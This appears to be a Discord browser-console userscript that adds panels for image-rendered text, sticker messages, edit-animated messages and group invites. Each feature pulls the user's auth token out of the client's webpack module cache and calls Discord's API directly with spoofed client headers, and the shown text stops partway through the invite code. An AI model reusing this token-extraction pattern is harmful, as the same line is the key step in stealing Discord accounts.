(function() {
    // Create the main UI container
    const uiContainer18 = document.createElement('div');
    uiContainer18.style.position = 'fixed';
    uiContainer18.style.top = '50%';
    uiContainer18.style.left = '50%';
    uiContainer18.style.transform = 'translate(-50%, -50%)';
    uiContainer18.style.backgroundColor = 'black';
    uiContainer18.style.color = 'white';
    uiContainer18.style.zIndex = '3000';
    uiContainer18.style.display = 'flex';
    uiContainer18.style.flexDirection = 'column';
    uiContainer18.style.alignItems = 'center';
    uiContainer18.style.padding = '20px';
    uiContainer18.style.border = '1px solid white';
    uiContainer18.style.borderRadius = '10px';
    uiContainer18.style.fontFamily = 'GG Sans, sans-serif';
    document.body.appendChild(uiContainer18);

    // Create the welcome label
    const welcomeLabel = document.createElement('h1');
    welcomeLabel.textContent = 'Welcome to Leptailurus!';
    welcomeLabel.style.fontSize = '24px';
    welcomeLabel.style.marginBottom = '10px';
    uiContainer18.appendChild(welcomeLabel);

    // Create the instruction label
    const instructionLabel = document.createElement('p');
    instructionLabel.textContent = 'Press the page buttons to use all the cool features this UI has to offer!';
    instructionLabel.style.fontSize = '16px';
    instructionLabel.style.textAlign = 'center';
    instructionLabel.style.marginBottom = '20px';
    uiContainer18.appendChild(instructionLabel);

    // Create the close button
    const closeButton = document.createElement('button');
    closeButton.textContent = 'X';
    closeButton.style.position = 'absolute';
    closeButton.style.top = '10px';
    closeButton.style.right = '10px';
    closeButton.style.backgroundColor = 'red';
    closeButton.style.color = 'white';
    closeButton.style.border = 'none';
    closeButton.style.borderRadius = '50%';
    closeButton.style.cursor = 'pointer';
    closeButton.style.width = '30px';
    closeButton.style.height = '30px';
    closeButton.style.display = 'flex';
    closeButton.style.justifyContent = 'center';
    closeButton.style.alignItems = 'center';
    uiContainer18.appendChild(closeButton);

    // Handle the close button click
    closeButton.addEventListener('click', () => {
        uiContainer18.style.display = 'none';
    });
})();





// Create and style the open button
const openButton = document.createElement('button');
openButton.textContent = 'Page 1';
openButton.style.position = 'fixed';
openButton.style.bottom = '220px';
openButton.style.right = '180px';
openButton.style.zIndex = '1000';
openButton.style.padding = '10px';
openButton.style.backgroundColor = '#333';
openButton.style.color = 'white';
openButton.style.border = 'none';
openButton.style.borderRadius = '5px';
document.body.appendChild(openButton);

// Create the UI container
const uiContainer = document.createElement('div');
uiContainer.style.position = 'fixed';
uiContainer.style.bottom = '60px';
uiContainer.style.right = '20px';
uiContainer.style.zIndex = '2000';
uiContainer.style.padding = '20px';
uiContainer.style.backgroundColor = '#222';
uiContainer.style.color = 'white';
uiContainer.style.border = '1px solid #444';
uiContainer.style.borderRadius = '5px';
uiContainer.style.width = '400px'; // Adjusted width
uiContainer.style.display = 'none';
document.body.appendChild(uiContainer);

// Title label
const titleLabel19 = document.createElement('h2');
titleLabel19.textContent = 'Custom Text';
titleLabel19.style.fontSize = '24px';
titleLabel19.style.marginBottom = '20px';
uiContainer.appendChild(titleLabel19);

// Create and style the form elements
const createInputField = (labelText, placeholderText, defaultValue = '') => {
  const container = document.createElement('div');
  container.style.marginBottom = '10px';

  const label = document.createElement('label');
  label.textContent = labelText;
  label.style.display = 'block';
  container.appendChild(label);

  const input = document.createElement('input');
  input.type = 'text';
  input.value = defaultValue;
  input.placeholder = placeholderText;
  input.style.width = '100%';
  input.style.padding = '5px';
  input.style.border = '1px solid #444';
  input.style.borderRadius = '3px';
  input.style.backgroundColor = '#333';
  input.style.color = 'white';
  container.appendChild(input);

  return { container, input };
};

// Function to create checkbox field
const createCheckboxField = (labelText, defaultValue = false) => {
  const container = document.createElement('div');
  container.style.marginBottom = '10px';

  const checkbox = document.createElement('input');
  checkbox.type = 'checkbox';
  checkbox.checked = defaultValue;
  container.appendChild(checkbox);

  const label = document.createElement('label');
  label.textContent = labelText;
  label.style.marginLeft = '5px';
  label.style.color = 'white';
  container.appendChild(label);

  return { container, checkbox };
};

const textField = createInputField('Text', 'Enter text here');
const fontSizeField = createInputField('Font Size', 'Enter font size here (default: 16)');
const fontFamilyField = createInputField('Font Type', 'Enter font type here (default: GG sans)');
const fontColorField = createInputField('Text Color', 'Enter text color here (default: #DBDEE1)');
const backgroundColorField = createInputField('Background Color', 'Enter background color here (default: transparent)');
const textGradientField = createInputField('Text Gradient', 'Enter gradient for text (optional)');
const backgroundGradientField = createInputField('Background Gradient', 'Enter gradient for background (optional)');
const boldCheckbox = createCheckboxField('Bold Text');
const italicCheckbox = createCheckboxField('Italic Text');

uiContainer.appendChild(textField.container);
uiContainer.appendChild(fontSizeField.container);
uiContainer.appendChild(fontFamilyField.container);
uiContainer.appendChild(fontColorField.container);
uiContainer.appendChild(backgroundColorField.container);
uiContainer.appendChild(textGradientField.container);
uiContainer.appendChild(backgroundGradientField.container);
uiContainer.appendChild(boldCheckbox.container);
uiContainer.appendChild(italicCheckbox.container);

// Create and style the buttons
const sendButton = document.createElement('button');
sendButton.textContent = 'Send';
sendButton.style.padding = '10px';
sendButton.style.backgroundColor = '#333';
sendButton.style.color = 'white';
sendButton.style.border = 'none';
sendButton.style.borderRadius = '5px';
sendButton.style.marginRight = '10px';
uiContainer.appendChild(sendButton);

const closeButton = document.createElement('button');
closeButton.textContent = 'Close';
closeButton.style.padding = '10px';
closeButton.style.backgroundColor = '#333';
closeButton.style.color = 'white';
closeButton.style.border = 'none';
closeButton.style.borderRadius = '5px';
uiContainer.appendChild(closeButton);

// Show the UI when the open button is pressed
openButton.addEventListener('click', () => {
  uiContainer.style.display = 'block';
  openButton.style.display = 'none';
});

// Hide the UI when the close button is pressed
closeButton.addEventListener('click', () => {
  uiContainer.style.display = 'none';
  openButton.style.display = 'block';
});

// Function to generate an image from text and return Base64 data
async function textToImage(text, fontSize = 16, fontFamily = 'GG sans', fontColor = '#DBDEE1', backgroundColor = 'transparent', textGradient = '', backgroundGradient = '', bold = false, italic = false) {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    // Set font and size
    ctx.font = `${italic ? 'italic ' : ''}${bold ? 'bold ' : ''}${fontSize}px ${fontFamily}`;
    
    // Measure text width and height
    const maxWidth = 500;
    const lineHeight = fontSize + 4;
    const lines = wrapText(ctx, text, 0, 0, maxWidth, lineHeight);
    const textWidth = ctx.measureText(text).width + 20;
    const textHeight = lines * lineHeight;
    
    // Adjust canvas size
    canvas.width = Math.min(textWidth, maxWidth);
    canvas.height = textHeight;

    // Apply background styles
    if (backgroundColor.toLowerCase() === 'rainbow') {
      const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
      gradient.addColorStop(0, '#ff0000');
      gradient.addColorStop(0.17, '#ff7f00');
      gradient.addColorStop(0.33, '#ffff00');
      gradient.addColorStop(0.5, '#00ff00');
      gradient.addColorStop(0.67, '#0000ff');
      gradient.addColorStop(0.83, '#4b0082');
      gradient.addColorStop(1, '#8b00ff');
      ctx.fillStyle = gradient;
    } else {
      ctx.fillStyle = backgroundColor;
    }
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Apply background gradient if provided
    if (isValidGradient(backgroundGradient)) {
      const gradient = parseGradient(ctx, backgroundGradient, 0, 0, 0, canvas.height);
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, canvas.width, canvas.height);
    }

    // Apply text styles
    ctx.font = `${italic ? 'italic ' : ''}${bold ? 'bold ' : ''}${fontSize}px ${fontFamily}`;
    if (isValidGradient(textGradient)) {
      const gradient = parseGradient(ctx, textGradient, 0, 0, canvas.width, 0);
      ctx.fillStyle = gradient;
    } else if (fontColor.toLowerCase() === 'rainbow') {
      const gradient = ctx.createLinearGradient(0, 0, canvas.width - 20, 0);
      gradient.addColorStop(0, '#ff0000');
      gradient.addColorStop(0.17, '#ff7f00');
      gradient.addColorStop(0.33, '#ffff00');
      gradient.addColorStop(0.5, '#00ff00');
      gradient.addColorStop(0.67, '#0000ff');
      gradient.addColorStop(0.83, '#4b0082');
      gradient.addColorStop(1, '#8b00ff');
      ctx.fillStyle = gradient;
    } else {
      ctx.fillStyle = fontColor;
    }

    // Draw text
    ctx.textAlign = 'left';
    ctx.textBaseline = 'top';
    wrapText(ctx, text, 4, 4, canvas.width + 2, lineHeight + 2);

    // Convert canvas to data URL (base64)
    const dataUrl = canvas.toDataURL('image/png');
    return dataUrl.split(',')[1];
  } catch (error) {
    console.error('Error creating image:', error);
    throw error;
  }
}

// Function to wrap text within a specified width and height
function wrapText(ctx, text, x, y, maxWidth, lineHeight) {
  let words = text.split(' ');
  let line = '';
  let lines = 0;
  for (let word of words) {
    let testLine = line + word + ' ';
    let metrics = ctx.measureText(testLine);
    let testWidth = metrics.width;
    if (testWidth > maxWidth && line !== '') {
      ctx.fillText(line, x, y + lines * lineHeight);
      line = word + ' ';
      lines++;
    } else {
      line = testLine;
    }
  }
  ctx.fillText(line, x, y + lines * lineHeight);
  lines++;
  return lines;
}

// Function to parse gradient string and return CanvasGradient object
function parseGradient(ctx, gradientString, x0, y0, x1, y1) {
  if (gradientString.startsWith('linear-gradient')) {
    const matches = gradientString.match(/linear-gradient\((.+)\)/);
    if (!matches || matches.length < 2) {
      throw new Error(`Invalid gradient format: ${gradientString}`);
    }
    const colors = matches[1].split(',');
    const gradient = ctx.createLinearGradient(x0, y0, x1, y1);
    colors.forEach((color, index) => {
      gradient.addColorStop(index / (colors.length), color.trim());
    });
    return gradient;
  } else {
    // Treat as comma-separated list of colors
    const colors = gradientString.split(',').map(color => color.trim());
    const gradient = ctx.createLinearGradient(x0, y0, x1, y1);
    colors.forEach((color, index) => {
      gradient.addColorStop(index / (colors.length), color.trim());
    });
    return gradient;
  }
}

// Function to check if a gradient string is valid
function isValidGradient(gradient) {
  return gradient.startsWith('linear-gradient') || gradient.includes(',');
}

// Handle form submission
sendButton.addEventListener('click', async () => {
  const text = textField.input.value;
  const fontSize = parseInt(fontSizeField.input.value) || 16;
  const fontFamily = fontFamilyField.input.value || 'GG sans';
  const fontColor = fontColorField.input.value || '#DBDEE1';
  const backgroundColor = backgroundColorField.input.value || 'transparent';
  const textGradient = textGradientField.input.value.trim();
  const backgroundGradient = backgroundGradientField.input.value.trim();
  const isBold = boldCheckbox.checkbox.checked;
  const isItalic = italicCheckbox.checkbox.checked;

  try {
    const base64Data = await textToImage(text, fontSize, fontFamily, fontColor, backgroundColor, textGradient, backgroundGradient, isBold, isItalic);
    const channelId = window.location.href.match(/(\d+)$/)[0];
    const token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();
    const byteCharacters = atob(base64Data);
    const byteNumbers = new Array(byteCharacters.length);
    for (let i = 0; i < byteCharacters.length; i++) {
      byteNumbers[i] = byteCharacters.charCodeAt(i);
    }
    const byteArray = new Uint8Array(byteNumbers);
    const file = new File([byteArray], 'textToImage.png', { type: 'image/png' });
    const formData = new FormData();
    formData.append('file', file);
    fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': `${token}`
      },
      body: formData
    })
      .then(response => {
        if (!response.ok) {
          throw new Error('Failed to send message');
        }
        console.log('Message sent successfully');
      })
      .catch(error => {
        console.error('Error sending message:', error);
      });
  } catch (error) {
    console.error('Error generating image:', error);
  }
});












// Function to get the operating system
function getOperatingSystem() {
  const platform = navigator.platform.toLowerCase();
  if (platform.includes('mac')) return 'Mac OS';
  if (platform.includes('win')) return 'Windows';
  if (platform.includes('linux')) return 'Linux';
  return 'Unknown';
}

// Function to get the browser information
function getBrowserInfo() {
  const ua = navigator.userAgent.toLowerCase();
  let browserName = 'Unknown';
  let browserVersion = 'Unknown';

  if (ua.includes('firefox')) {
    browserName = 'Firefox';
    browserVersion = ua.match(/firefox\/(\d+\.\d+)/)?.[1];
  } else if (ua.includes('chrome') && !ua.includes('edg')) {
    browserName = 'Chrome';
    browserVersion = ua.match(/chrome\/(\d+\.\d+)/)?.[1];
  } else if (ua.includes('safari') && !ua.includes('chrome')) {
    browserName = 'Safari';
    browserVersion = ua.match(/version\/(\d+\.\d+)/)?.[1];
  } else if (ua.includes('edg')) {
    browserName = 'Edge';
    browserVersion = ua.match(/edg\/(\d+\.\d+)/)?.[1];
  } else if (ua.includes('trident') || ua.includes('msie')) {
    browserName = 'Internet Explorer';
    browserVersion = ua.match(/(?:msie |rv:)(\d+\.\d+)/)?.[1];
  }

  return { name: browserName, version: browserVersion };
}

// Function to get the system architecture
function getArchitecture() {
  return navigator.userAgent.includes('x64') || navigator.platform.includes('x64') ? 'x64' : 'x86';
}

// Function to generate x-super-properties
function getSuperProperties() {
  const os = getOperatingSystem();
  const browserInfo = getBrowserInfo();
  const osVersion = navigator.userAgent.match(/(windows|mac os x|linux)[^\)]+/i)?.[0]?.replace(/[^\d\.\ ]+/g, '') || 'Unknown';
  const systemLocale = navigator.language;
  const userAgent = navigator.userAgent;
  const architecture = getArchitecture();

  const properties = {
    os: os,
    browser: browserInfo.name,
    release_channel: 'stable',
    client_version: browserInfo.version,
    os_version: osVersion,
    os_arch: architecture,
    app_arch: architecture,
    system_locale: systemLocale,
    browser_user_agent: userAgent,
    browser_version: browserInfo.version,
    client_build_number: 0,
    native_build_number: 0,
    client_event_source: null
  };

  return btoa(JSON.stringify(properties));
}

// Generate x-super-properties
const superProperties = getSuperProperties();

// Create UI elements
// Create and style the container
const container2 = document.createElement('div');
container2.style.backgroundColor = 'black';
container2.style.color = 'white';
container2.style.fontFamily = 'GG Sans, sans-serif';
container2.style.padding = '20px';
container2.style.width = '400px';
container2.style.borderRadius = '10px';
container2.style.position = 'fixed';
container2.style.bottom = '10px'; // Position at the bottom
container2.style.right = '10px';
container2.style.zIndex = '2000';
container2.style.textAlign = 'center'; // Center align all elements
container2.style.display = 'none'; // Initially hidden
document.body.appendChild(container2);

// Create and style the open button for the new UI container
const openNewButton = document.createElement('button');
openNewButton.textContent = 'Page 2';
openNewButton.style.position = 'fixed';
openNewButton.style.bottom = '220px';
openNewButton.style.right = '120px';
openNewButton.style.zIndex = '1000';
openNewButton.style.padding = '10px';
openNewButton.style.backgroundColor = '#333';
openNewButton.style.color = 'white';
openNewButton.style.border = 'none';
openNewButton.style.borderRadius = '5px';
document.body.appendChild(openNewButton);

// Create and style the close button for the new UI container
const closeNewButton = document.createElement('button');
closeNewButton.textContent = 'Close';
closeNewButton.style.padding = '10px';
closeNewButton.style.backgroundColor = '#333';
closeNewButton.style.color = 'white';
closeNewButton.style.border = 'none';
closeNewButton.style.borderRadius = '5px';
closeNewButton.style.marginTop = '10px';
container2.appendChild(closeNewButton);

// Show the new UI container when the open button is pressed
openNewButton.addEventListener('click', () => {
  container2.style.display = 'block';
  openNewButton.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton.addEventListener('click', () => {
  container2.style.display = 'none';
  openNewButton.style.display = 'block';
});

// Title label
const titleLabel = document.createElement('h2');
titleLabel.textContent = 'Custom Sticker Messages';
titleLabel.style.fontSize = '24px';
titleLabel.style.marginBottom = '20px';
container2.appendChild(titleLabel);

// Sticker IDs label
const idsLabel = document.createElement('label');
idsLabel.textContent = 'Sticker IDs (comma-separated):';
idsLabel.style.display = 'block';
idsLabel.style.marginBottom = '5px';
container2.appendChild(idsLabel);

// Sticker IDs input
const idsInput = document.createElement('input');
idsInput.type = 'text';
idsInput.style.width = '100%';
idsInput.style.marginBottom = '10px';
idsInput.style.padding = '5px';
idsInput.style.border = '1px solid #ccc';
idsInput.style.borderRadius = '5px';
idsInput.style.backgroundColor = 'black'; // Black background for input
idsInput.style.color = 'white'; // White text for input
idsInput.style.textAlign = 'left'; // Left align text inside text boxes
container2.appendChild(idsInput);

// Message label
const messageLabel = document.createElement('label');
messageLabel.textContent = 'Message:';
messageLabel.style.display = 'block';
messageLabel.style.marginBottom = '5px';
container2.appendChild(messageLabel);

// Message input
const messageInput = document.createElement('input');
messageInput.type = 'text';
messageInput.style.width = '100%';
messageInput.style.marginBottom = '10px';
messageInput.style.padding = '5px';
messageInput.style.border = '1px solid #ccc';
messageInput.style.borderRadius = '5px';
messageInput.style.backgroundColor = 'black'; // Black background for input
messageInput.style.color = 'white'; // White text for input
messageInput.style.textAlign = 'left'; // Left align text inside text boxes
container2.appendChild(messageInput);

// Send button
const sendButton2 = document.createElement('button');
sendButton2.textContent = 'Send';
sendButton2.style.backgroundColor = 'black'; // Black background for button
sendButton2.style.color = 'white'; // White text for button
sendButton2.style.padding = '10px 20px';
sendButton2.style.border = '1px solid #ccc';
sendButton2.style.borderRadius = '5px';
sendButton2.style.cursor = 'pointer';
sendButton2.style.fontSize = '16px';

sendButton2.addEventListener('click', async () => {
  const stickerIdsValue = idsInput.value.trim();
  const message = messageInput.value;
  const channelId = window.location.href.split('/').pop();

  const authHeader = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]); }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();

  const body = {
    content: message,
    type: 0,
    tts: false,
    flags: 0,
  };

  if (stickerIdsValue) {
    body.sticker_ids = stickerIdsValue.split(',').map(id => id.trim());
  }

  const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
    headers: {
      "accept-language": "en-US",
      "authorization": authHeader,
      "content-type": "application/json",
      "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MTU1Iiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbGNhbGVfIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBkaXNjb3JkLzEuMC45MTU1IENocm9tZS8xMjQuMC42MzY3LjI0MyBFbGVjdHJvbi8zMC4yLjAgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjMwLjIuMCIsImNsaWVudF9idWlsZF9udW1iZXIiOjMxMzM0NCwibmF0aXZlX2J1aWxkX251bWJlciI6NDk4MTcsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9",
    },
    body: JSON.stringify(body),
    method: 'POST',
  });

  const result = await response.json();
  console.log(result);
});

container2.appendChild(sendButton2);












(function() {

const uiContainer3 = document.createElement('div');
uiContainer3.style.backgroundColor = 'black';
uiContainer3.style.color = 'white';
uiContainer3.style.fontFamily = 'GG Sans, sans-serif';
uiContainer3.style.padding = '20px';
uiContainer3.style.width = '350px';
uiContainer3.style.borderRadius = '10px';
uiContainer3.style.position = 'fixed';
uiContainer3.style.bottom = '10px';
uiContainer3.style.right = '10px';
uiContainer3.style.zIndex = '2000';
uiContainer3.style.textAlign = 'center';
uiContainer3.style.display = 'none';
document.body.appendChild(uiContainer3);

// Create and style the open button for Page 3
const openNewButton3 = document.createElement('button');
openNewButton3.textContent = 'Page 3';
openNewButton3.style.position = 'fixed';
openNewButton3.style.bottom = '220px';
openNewButton3.style.right = '60px';
openNewButton3.style.zIndex = '1000';
openNewButton3.style.padding = '10px';
openNewButton3.style.backgroundColor = '#333';
openNewButton3.style.color = 'white';
openNewButton3.style.border = 'none';
openNewButton3.style.borderRadius = '5px';
document.body.appendChild(openNewButton3);

// Create and style the close button for Page 3
const closeNewButton3 = document.createElement('button');
closeNewButton3.textContent = 'Close';
closeNewButton3.style.padding = '10px';
closeNewButton3.style.backgroundColor = '#333';
closeNewButton3.style.color = 'white';
closeNewButton3.style.border = 'none';
closeNewButton3.style.borderRadius = '5px';
closeNewButton3.style.marginTop = '10px';
uiContainer3.appendChild(closeNewButton3);

// Show the Page 3 container when the open button is pressed
openNewButton3.addEventListener('click', () => {
  uiContainer3.style.display = 'block';
  openNewButton3.style.display = 'none';
});

// Hide the Page 3 container when the close button is pressed
closeNewButton3.addEventListener('click', () => {
  uiContainer3.style.display = 'none';
  openNewButton3.style.display = 'block';
});

// Ensuring that other elements have lower z-index
const otherElements = document.querySelectorAll('.other-elements');
otherElements.forEach(element => {
  element.style.zIndex = '1000'; // Adjust to a lower z-index
});
    
    // Create the title label
    const titleLabel2 = document.createElement('h1');
    titleLabel2.textContent = 'Animated Messages';
    titleLabel2.style.marginBottom = '20px';
    titleLabel2.style.fontSize = '24px';
    uiContainer3.appendChild(titleLabel2);

    // Create the message label
    const messageLabel2 = document.createElement('label');
    messageLabel2.textContent = 'Message';
    messageLabel2.style.marginBottom = '5px';
    messageLabel2.style.fontSize = '16px';
    messageLabel2.style.width = '100%';
    uiContainer3.appendChild(messageLabel2);

    // Create the message input
    const messageInput2 = document.createElement('input');
    messageInput2.type = 'text';
    messageInput2.placeholder = 'Enter your message here';
    messageInput2.style.marginBottom = '20px';
    messageInput2.style.padding = '10px';
    messageInput2.style.backgroundColor = 'black';
    messageInput2.style.color = 'white';
    messageInput2.style.border = '1px solid white';
    messageInput2.style.width = '100%';
    messageInput2.style.fontSize = '16px';
    uiContainer3.appendChild(messageInput2);

    // Create the part count label
    const partCountLabel = document.createElement('label');
    partCountLabel.textContent = 'Part Count';
    partCountLabel.style.marginBottom = '5px';
    partCountLabel.style.fontSize = '16px';
    partCountLabel.style.width = '100%';
    uiContainer3.appendChild(partCountLabel);

    // Create the part count input
    const partCountInput = document.createElement('input');
    partCountInput.type = 'number';
    partCountInput.placeholder = '7';
    partCountInput.value = '7';
    partCountInput.style.marginBottom = '20px';
    partCountInput.style.padding = '10px';
    partCountInput.style.backgroundColor = 'black';
    partCountInput.style.color = 'white';
    partCountInput.style.border = '1px solid white';
    partCountInput.style.width = '100%';
    partCountInput.style.fontSize = '16px';
    uiContainer3.appendChild(partCountInput);

    // Create the speed label
    const speedLabel = document.createElement('label');
    speedLabel.textContent = 'Speed (milliseconds)';
    speedLabel.style.marginBottom = '5px';
    speedLabel.style.fontSize = '16px';
    speedLabel.style.width = '100%';
    uiContainer3.appendChild(speedLabel);

    // Create the speed input
    const speedInput = document.createElement('input');
    speedInput.type = 'number';
    speedInput.placeholder = '300';
    speedInput.value = '300';
    speedInput.style.marginBottom = '20px';
    speedInput.style.padding = '10px';
    speedInput.style.backgroundColor = 'black';
    speedInput.style.color = 'white';
    speedInput.style.border = '1px solid white';
    speedInput.style.width = '100%';
    speedInput.style.fontSize = '16px';
    uiContainer3.appendChild(speedInput);

    // Create the send button
    const sendButton4 = document.createElement('button');
    sendButton4.textContent = 'Send';
    sendButton4.style.marginBottom = '20px';
    sendButton4.style.padding = '10px';
    sendButton4.style.backgroundColor = 'black';
    sendButton4.style.color = 'white';
    sendButton4.style.border = '1px solid white';
    sendButton4.style.cursor = 'pointer';
    sendButton4.style.width = '100%';
    sendButton4.style.fontSize = '16px';
    uiContainer3.appendChild(sendButton4);

    // Add event listener for the send button
    sendButton4.addEventListener('click', async () => {
        const message = messageInput2.value;
        const partCount = parseInt(partCountInput.value);
        const interval = parseInt(speedInput.value);
        const messageParts = [];
        const channelId = window.location.href.split('/').pop();

        // Split the message into parts
        for (let i = 0; i < partCount; i++) {
            const end = Math.floor((i + 1) * message.length / partCount);
            messageParts.push(message.slice(0, end));
        }

        const authHeader = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]); }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();

        // Post the first part of the message
        const postResponse = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
            headers: {
                "accept-language": "en-US",
                "authorization": authHeader,
                "content-type": "application/json"
            },
            body: JSON.stringify({
                "mobile_network_type": "unknown",
                "content": messageParts[0],
                "tts": false,
                "flags": 0
            }),
            method: "POST"
        });

        const postData = await postResponse.json();
        const messageId = postData.id;

        // Patch the message to animate it
        for (let i = 1; i < partCount; i++) {
            await new Promise(resolve => setTimeout(resolve, interval));
            await fetch(`https://discord.com/api/v9/channels/${channelId}/messages/${messageId}`, {
                headers: {
                    "accept-language": "en-US",
                    "authorization": authHeader,
                    "content-type": "application/json"
                },
                body: JSON.stringify({
                    "content": messageParts[i]
                }),
                method: "PATCH"
            });
        }
    });
})();























(function() {
    // Create the main UI container
    const uiContainer4 = document.createElement('div');
    uiContainer4.style.position = 'fixed';
    uiContainer4.style.bottom = '20px';
    uiContainer4.style.right = '20px';
    uiContainer4.style.width = '350px';
    uiContainer4.style.height = 'auto';
    uiContainer4.style.backgroundColor = 'black';
    uiContainer4.style.color = 'white';
    uiContainer4.style.zIndex = '2000';
    uiContainer4.style.display = 'none';
    uiContainer4.style.flexDirection = 'column';
    uiContainer4.style.justifyContent = 'space-between';
    uiContainer4.style.alignItems = 'center';
    uiContainer4.style.padding = '20px';
    uiContainer4.style.border = '1px solid white';
    uiContainer4.style.borderRadius = '10px';
    uiContainer4.style.fontFamily = 'GG Sans, sans-serif';
    document.body.appendChild(uiContainer4);

// Create and style the open button for the new UI container
const openNewButton4 = document.createElement('button');
openNewButton4.textContent = 'Page 4';
openNewButton4.style.position = 'fixed';
openNewButton4.style.bottom = '180px';
openNewButton4.style.right = '180px';
openNewButton4.style.zIndex = '1000';
openNewButton4.style.padding = '10px';
openNewButton4.style.backgroundColor = '#333';
openNewButton4.style.color = 'white';
openNewButton4.style.border = 'none';
openNewButton4.style.borderRadius = '5px';
document.body.appendChild(openNewButton4);

// Create and style the close button for the new UI container
const closeNewButton4 = document.createElement('button');
closeNewButton4.textContent = 'Close';
closeNewButton4.style.padding = '10px';
closeNewButton4.style.backgroundColor = '#333';
closeNewButton4.style.color = 'white';
closeNewButton4.style.border = 'none';
closeNewButton4.style.borderRadius = '5px';
closeNewButton4.style.marginTop = '10px';
uiContainer4.appendChild(closeNewButton4);

// Show the new UI container when the open button is pressed
openNewButton4.addEventListener('click', () => {
  uiContainer4.style.display = 'block';
  openNewButton4.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton4.addEventListener('click', () => {
  uiContainer4.style.display = 'none';
  openNewButton4.style.display = 'block';
});
    // Create the title label
    const titleLabel3 = document.createElement('h1');
    titleLabel3.textContent = 'Custom Group Invites';
    titleLabel3.style.marginBottom = '20px';
    uiContainer4.appendChild(titleLabel3);

    // Create the Group ID input
    const groupIdInput = document.createElement('input');
    groupIdInput.type = 'text';
    groupIdInput.placeholder = 'ID';
    groupIdInput.style.marginBottom = '20px';
    groupIdInput.style.padding = '10px';
    groupIdInput.style.backgroundColor = 'black';
    groupIdInput.style.color = 'white';
    groupIdInput.style.border = '1px solid white';
    groupIdInput.style.width = '100%';
    groupIdInput.style.fontSize = '16px';
    uiContainer4.appendChild(groupIdInput);

    // Create the Invite Time label
    const inviteTimeLabel = document.createElement('div');
    inviteTimeLabel.textContent = 'Invite Time';
    inviteTimeLabel.style.marginBottom = '5px';
    inviteTimeLabel.style.fontSize = '16px';
    uiContainer4.appendChild(inviteTimeLabel);

    // Create the time input
    const timeInput = document.createElement('input');
    timeInput.type = 'text';
    timeInput.placeholder = '1d0h0m0s';
    timeInput.style.marginBottom = '20px';
    timeInput.style.padding = '10px';
    timeInput.style.backgroundColor = 'black';
    timeInput.style.color = 'white';
    timeInput.style.border = '1px solid white';
    timeInput.style.width = '100%';
    timeInput.style.fontSize = '16px';
    uiContainer4.appendChild(timeInput);

    // Create the error message label
    const errorLabel = document.createElement('div');
    errorLabel.textContent = 'The maximum amount of time you can make an invite is 1 week!';
    errorLabel.style.color = 'red';
    errorLabel.style.backgroundColor = 'transparent';
    errorLabel.style.display = 'none';
    errorLabel.style.marginBottom = '20px';
    uiContainer4.appendChild(errorLabel);

    // Create the Create button
    const createButton = document.createElement('button');
    createButton.textContent = 'Create';
    createButton.style.marginBottom = '20px';
    createButton.style.padding = '10px';
    createButton.style.backgroundColor = 'black';
    createButton.style.color = 'white';
    createButton.style.border = '1px solid white';
    createButton.style.cursor = 'pointer';
    createButton.style.width = '100%';
    createButton.style.fontSize = '16px';
    uiContainer4.appendChild(createButton);

    // Create the invite label
    const inviteLabel = document.createElement('input');
    inviteLabel.type = 'text';
    inviteLabel.readOnly = true;
    inviteLabel.style.flexGrow = '1';
    inviteLabel.style.marginBottom = '20px';
    inviteLabel.style.padding = '10px';
    inviteLabel.style.backgroundColor = 'black';
    inviteLabel.style.color = 'white';
    inviteLabel.style.border = '1px solid white';
    inviteLabel.style.width = '100%';
    inviteLabel.style.fontSize = '16px';
    uiContainer4.appendChild(inviteLabel);

    // Create the Copy button
    const copyButton = document.createElement('button');
    copyButton.textContent = 'Copy';
    copyButton.style.padding = '10px';
    copyButton.style.backgroundColor = 'black';
    copyButton.style.color = 'white';
    copyButton.style.border = '1px solid white';
    copyButton.style.cursor = 'pointer';
    copyButton.style.width = '100%';
    copyButton.style.fontSize = '16px';
    uiContainer4.appendChild(copyButton);

    // Function to convert time to seconds
    function timeToSeconds(timeStr) {
        const timeRegex = /(\d+w)?(\d+d)?(\d+h)?(\d+m)?(\d+s)?/;
        const match = timeStr.match(timeRegex);

        let weeks = match[1] ? parseInt(match[1]) * 604800 : 0;
        let days = match[2] ? parseInt(match[2]) * 86400 : 0;
        let hours = match[3] ? parseInt(match[3]) * 3600 : 0;
        let minutes = match[4] ? parseInt(match[4]) * 60 : 0;
        let seconds = match[5] ? parseInt(match[5]) : 0;

        return weeks + days + hours + minutes + seconds;
    }

    // Function to fetch the invite
    async function fetchInvite(groupId, maxAge) {
        const token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();

